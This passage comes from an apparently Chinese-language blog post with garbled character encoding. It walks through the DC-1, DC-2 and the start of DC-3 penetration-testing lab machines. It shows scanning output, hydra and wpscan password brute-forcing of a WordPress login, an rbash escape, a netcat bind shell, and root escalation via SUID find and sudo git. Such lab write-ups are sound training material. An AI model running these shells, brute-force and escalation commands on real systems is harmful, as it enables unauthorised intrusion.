class="line">&#x2F;sbin&#x2F;mount.nfs</span><br></pre></td></tr></table></figure>



<p>å‘ç°å¯ä»¥findææƒ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;whoami&quot; \;                                                           </span><br><span class="line">find -name flag4.txt -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure>





<p><strong>æ³•ä¸€ï¼šã€ç›´æ¥ææƒã€‘</strong></p>
<p>ææƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>å³å¯æ‰“å¼€finalflag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>





<p><strong>æ³•äºŒï¼šã€æå‡netcatæƒé™ã€‘</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">&lt;find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;                       </span><br><span class="line">listening on [any] 2233 ...</span><br><span class="line">192.168.33.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.33.136] from (UNKNOWN) [192.168.33.128] 49168</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¦å¤–ä¸€ä¸ªæ²¡æœ‰msfconsoleçš„ç»ˆç«¯ï¼š</span><br><span class="line">netcat 192.168.33.136 2233</span><br><span class="line"></span><br><span class="line">ä¹‹åæ­£å¸¸æ‰§è¡Œå°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure>











<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-1.png" alt="2-1"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -v 192.168.33.137 		&#x2F;&#x2F;-væ˜¯å¢å¼ºæœç´¢æ•ˆæœï¼Œ-vvæ›´å¼º</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ç»“æœï¼š</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">80&#x2F;tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;dc-2&#x2F;</span><br><span class="line">7744&#x2F;tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e&#x2F;C1hLs6R0CH1fSWfpJ0x45g77ZaEn&#x2F;nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB&#x2F;QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1&#x2F;xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN&#x2F;aBITwGOIBGrp06w&#x3D;&#x3D;</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH&#x2F;VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf&#x2F;QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud&#x2F;SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR&#x2F;PYR9</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE&#x3D;</span><br><span class="line">|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky&#x2F;2s+wXTH</span><br></pre></td></tr></table></figure>





<p>æˆ‘ä»¬è®¿é—®80ç«¯å£ï¼š</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-2.png" alt="2-2"></p>
<p>æˆ‘ä»¬å‘ç°è¢«é‡å®šå‘åˆ°dc-2ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é…ç½®é™æ€è·¯ç”±ï¼Œç›´æ¥ç”¨<strong>åŸŸåè®¿é—®</strong>ã€‚</p>
<blockquote>
<p>é…ç½®é™æ€è·¯ç”±ï¼š</p>
<p>linuxï¼š/etc/hosts</p>
<p>windows:C:\Windows\System32\drivers\etc\hosts</p>
</blockquote>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-3.png" alt="2-3"></p>
<p>æ‰«æä¸€ä¸‹ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[08:06:37] Starting: </span><br><span class="line">[08:06:46] 200 -   52KB - &#x2F;index.php                                                                                                    </span><br><span class="line">[08:06:47] 200 -   19KB - &#x2F;license.txt                                                                  </span><br><span class="line">[08:06:49] 200 -    7KB - &#x2F;readme.html                                                         </span><br><span class="line">[08:06:51] 301 -  319B  - &#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-admin&#x2F;                                          </span><br><span class="line">[08:06:52] 301 -  321B  - &#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-content&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-content&#x2F;                </span><br><span class="line">[08:06:52] 200 -   69B  - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php                               </span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-content&#x2F;plugins&#x2F;hello.php                       </span><br><span class="line">[08:06:52] 200 -    1B  - &#x2F;wp-admin&#x2F;admin-ajax.php           </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-admin&#x2F;  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F192.168.33.137%2Fwp-admin%2F&amp;reauth&#x3D;1</span><br><span class="line">[08:06:52] 301 -  322B  - &#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-includes&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-config.php                         </span><br><span class="line">[08:06:52] 200 -    2KB - &#x2F;wp-login.php</span><br><span class="line">[08:06:52] 200 -   40KB - &#x2F;wp-includes&#x2F;   </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-signup.php  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?action&#x3D;register</span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-includes&#x2F;rss-functions.php</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-cron.php</span><br><span class="line">[08:06:53] 500 -    4KB - &#x2F;wp-admin&#x2F;setup-config.php</span><br><span class="line">[08:06:53] 405 -   42B  - &#x2F;xmlrpc.php</span><br><span class="line">[08:06:53] 200 -    1KB - &#x2F;wp-admin&#x2F;install.php</span><br></pre></td></tr></table></figure>





<h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><p>å‘ç°flag1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just canâ€™t win them all.	</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you canâ€™t find it, log in as another.</span><br></pre></td></tr></table></figure>



<h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æç¤ºé‡Œçš„cewlæ¥çˆ¬å–æœ‰å…³å¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2&#x2F; -w dc2.txt</span><br></pre></td></tr></table></figure>

<p>å†ç”¨wpscanåˆ—å‡ºä¸€äº›ç”¨æˆ·åï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; --enumerate u</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å¯ä»¥bpçˆ†ç ´ï¼Œä¹Ÿå¯ä»¥hydraçˆ†ç ´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt  -P passwd.txt dc-2 http-form-post &#39;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location&#39;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨wpscanç›´æ¥çˆ†ç ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P  wordlist.txt</span><br></pre></td></tr></table></figure>







<h2 id="é—®é¢˜1ã€hydraã€‘"><a href="#é—®é¢˜1ã€hydraã€‘" class="headerlink" title="é—®é¢˜1ã€hydraã€‘"></a>é—®é¢˜1ã€hydraã€‘</h2><blockquote>
<p>æŠ“åŒ…çš„POSTæ•°æ®æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log&#x3D;admin&amp;pwd&#x3D;sit&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;testcookie&#x3D;1</span><br></pre></td></tr></table></figure>

<p>ä¸ºå•¥è¦æ”¹æˆä¸Šè¿°æ ·å­ï¼Ÿï¼Ÿï¼Ÿ</p>
</blockquote>
<p>çˆ†å‡ºä¸¤ä¸ªå¯†ç ï¼Œç™»å½•ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-04-13 08:39:16</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3&#x2F;p:238), ~45 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;dc-2:80&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location</span><br><span class="line">[80][http-post-form] host: dc-2   login: tom   password: parturient</span><br><span class="line">[80][http-post-form] host: dc-2   login: jerry   password: adipiscing</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-04-13 08:40:02</span><br></pre></td></tr></table></figure>



<p>ç™»å½•jerryï¼Œæ‰¾åˆ°flag2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>





<h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>æ­£å¸¸msfconsoleå—é˜»äº†ï¼Œæƒ³èµ·ä¹‹å‰ä¸€ä¸ª7744ç«¯å£ï¼Œå°è¯•sshç™»å½•ï¼ŒæˆåŠŸç™»å½•tomè´¦å·ï¼Œå‘ç°flag3.txtï¼Œä½†æ˜¯æ— æ³•ä½¿ç”¨catç­‰å‘½ä»¤<img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-4.png" alt="2-4"></p>
<p><strong>æ³•ä¸€</strong>ï¼šviå¯ä»¥ä½¿ç”¨ã€ä¸è¿‡æ„Ÿè§‰æœ‰ç‚¹å°èªæ˜ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>



<p><strong>æ³•äºŒ</strong>ï¼šç»•è¿‡rbashï¼Œåˆ‡æ¢/bin/bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>



<h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><p>çœ‹åˆ°flag3çš„å†…å®¹æƒ³åˆ°æ˜¯è¦ç»™tomææƒã€‚</p>
<p>åæ¥å‘ç°flag4åªè¦åˆ‡æ¢jerryå°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªfinalflagå¤§æ¦‚ç‡æ˜¯è¦åœ¨rootç›®å½•ä¸‹è·å–äº†ã€‚ã€å¯èƒ½è¿˜æ˜¯å’Œgitæœ‰å…³ã€‘</p>
<h2 id="thefinalflag-1"><a href="#thefinalflag-1" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>ä½¿ç”¨tomæ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸è¡Œï¼Œäºæ˜¯åˆ‡æ¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>

<p>æ¥æ‰§è¡Œï¼Œå‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;git</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯ä»¥æ— å¯†ç æ‰§è¡Œrootçš„gitï¼</p>
<p>å…³äºgitææƒå¯ä»¥çœ‹<a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">è¿™ä¸ª</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>ææƒå®Œå³å¯å‘ç°finalflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># cat final-flag.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">&#x2F; &#x2F; &#x2F;\ \ \___| | |   __| | ___  _ __   ___  &#x2F; \</span><br><span class="line">\ \&#x2F;  \&#x2F; &#x2F; _ \ | |  &#x2F; _&#96; |&#x2F; _ \| &#39;_ \ &#x2F; _ \&#x2F;  &#x2F;</span><br><span class="line"> \  &#x2F;\  &#x2F;  __&#x2F; | | | (_| | (_) | | | |  __&#x2F;\_&#x2F; </span><br><span class="line">  \&#x2F;  \&#x2F; \___|_|_|  \__,_|\___&#x2F;|_| |_|\___\&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#39;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>





<p>SUIDææƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸å¤ªè¡Œ</p>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="ä¿¡æ¯æ”¶é›†-2"><a href="#ä¿¡æ¯æ”¶é›†-2" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆnmapå‘ç°IPï¼š192.168.33.138</p>
<p>æ‰«ä¸€ä¸‹ç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-18 08:39 EDT</span><br><span class="line">Nmap scan report for 192.168.33.138</span><br><span class="line">Host is up (0.00100s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:4E:BC:23 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds</span><br></pre></td></tr></table></figure>

<p>åŠ å¼ºæ‰«ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:4E:BC:23 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.007 days (since Sun Apr 18 08:30:26 2021)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure>



<p>æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ï¼š</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-1.png" alt="3-1"></p>
<p>å‘ç°</p>
